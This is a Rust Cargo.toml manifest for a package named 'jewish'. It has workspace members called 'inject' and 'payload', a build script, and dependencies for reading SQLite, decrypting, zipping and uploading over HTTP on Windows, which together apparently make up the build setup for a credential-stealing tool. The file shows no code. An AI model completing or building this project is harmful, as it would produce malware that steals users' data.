[workspace]
members = [".", "src/inject", "src/payload"]
resolver = "2"

[package]
name = "jewish"
version = "1.0.0"
edition = "2021"
build = "build.rs"

[[bin]]
name = "jewish"
path = "src/main.rs"

[profile.release]
opt-level = 3

[dependencies]
inject = { path = "src/inject" }
tokio = { version = "1", features = ["rt-multi-thread", "macros"] }
reqwest = { version = "0.11", default-features = false, features = ["json", "multipart", "rustls-tls"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
aes-gcm = "0.10"
base64 = "0.21"
rand = "0.8"
sha2 = "0.10"
once_cell = "1.19"
regex = "1"
chrono = "0.4"
zip = "0.6"
flate2 = "1.0"                     # pour ci.rs + build.rs
libloading = "0.8"
rusqlite = { version = "0.29.0", features = ["bundled"] }
chacha20poly1305 = "0.10"
windows = { version = "0.58", features = [
    "Win32_Foundation",
    "Win32_System_Console",
] }

[build-dependencies]
flate2 = "1.0"                     # pour build.rs
winresource = "0.1"
